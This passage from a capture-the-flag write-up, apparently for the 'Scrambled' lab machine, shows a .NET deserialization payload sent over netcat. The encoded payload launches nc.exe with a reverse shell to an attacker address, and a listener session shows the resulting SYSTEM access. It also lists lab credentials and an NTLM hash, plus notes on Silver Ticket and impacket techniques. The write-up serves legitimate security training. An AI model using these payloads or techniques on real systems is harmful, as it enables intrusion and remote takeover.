HMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1NdVpYaGxJQzFsSUdOdFpDQXhNQzR4TUM0eE5DNHlJREV5TXpRaUlGTjBZVzVrWVhKa1JYSnliM0pGYm1OdlpHbHVaejBpZTNnNlRuVnNiSDBpSUZOMFlXNWtZWEprVDNWMGNIVjBSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJWYzJWeVRtRnRaVDBpSWlCUVlYTnpkMjl5WkQwaWUzZzZUblZzYkgwaUlFUnZiV0ZwYmowaUlpQk1iMkZrVlhObGNsQnliMlpwYkdVOUlrWmhiSE5sSWlCR2FXeGxUbUZ0WlQwaVkyMWtJaUF2UGcwS0lDQWdJQ0FnUEM5elpEcFFjbTlqWlhOekxsTjBZWEowU1c1bWJ6NE5DaUFnSUNBOEwzTmtPbEJ5YjJObGMzTStEUW9nSUR3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrOWlhbVZqZEVsdWMzUmhibU5sUGcwS1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStDdz09Cw==
```

We can use this payload to send this data through the service opened on port 4411:
```bash
nc 10.10.11.168 4411              
SCRAMBLECORP_ORDERS_V1.0.3;
UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA8AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBMUFVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1NdVpYaGxJQzFsSUdOdFpDQXhNQzR4TUM0eE5DNHlJREV5TXpRaUlGTjBZVzVrWVhKa1JYSnliM0pGYm1OdlpHbHVaejBpZTNnNlRuVnNiSDBpSUZOMFlXNWtZWEprVDNWMGNIVjBSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJWYzJWeVRtRnRaVDBpSWlCUVlYTnpkMjl5WkQwaWUzZzZUblZzYkgwaUlFUnZiV0ZwYmowaUlpQk1iMkZrVlhObGNsQnliMlpwYkdVOUlrWmhiSE5sSWlCR2FXeGxUbUZ0WlQwaVkyMWtJaUF2UGcwS0lDQWdJQ0FnUEM5elpEcFFjbTlqWlhOekxsTjBZWEowU1c1bWJ6NE5DaUFnSUNBOEwzTmtPbEJ5YjJObGMzTStEUW9nSUR3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrOWlhbVZqZEVsdWMzUmhibU5sUGcwS1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStDdz09Cw==
ERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.

```

And we get NT AUTHORITY\\SYSTEM...
```bash
rlwrap nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.168] 64655
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

### Credentials

```bash
ksimpson@scrm.local:ksimpson
sqlsvc:Pegasus60 -> SPN -> MSSQLSvc/dc1.scrm.local -> NTLM HASH: b999a16500b87d17ec7f2e2a68778f05 -> SID: S-1-5-21-2743207045-1827831105-254252320
MiscSvc:ScrambledEggs9900
```

### Notes

- To exploit a Silver Ticket we need 3 parameters:
	* DC SID
	* SPN
	* NTLM Hash
* To create a deserialization attack it is a good idea to identify which one is the vulnerable input/code, it can be .NET, Java, etc. so in order to generate the payload we need to also understand the gadget and function that will be executed with ysoserial.
* It is important to understand the impacket utilities in order to exploit an Active Directory on a better way, 
	* Generate silver & golden tickets (impacket-ticketer)
	* Connect to mssql database (impacket-mssqlclient)
	* Extracting TGT tickets for an ASREPRoast attack (impacket-GetNPUsers)
	* Extracting SPNs (impacket-GetUserSPNs)
	* Extract DC SID (impacket-getPac)
	* Start an SMB Server (impacket-smbserver)
	* Connect to an SMB Server (impacket-smbclient)
### References

[SilverTicket Explanation Minuto 1:20:00](https://www.youtube.com/watch?v=osmFGqnFe8c&ab_channel=S4viOnLive%28BackupDirectosdeTwitch%29):
![[Pasted image 20230122223446.png]]
[ysoserial.net](https://github.com/pwntester/ysoserial.net/releases/tag/v1.35)
[GetUserSNPs.py issue](https://github.com/fortra/impacket/issues/1206)
[NTLM Hash Generator](https://codebeautify.org/ntlm-hash-generator)
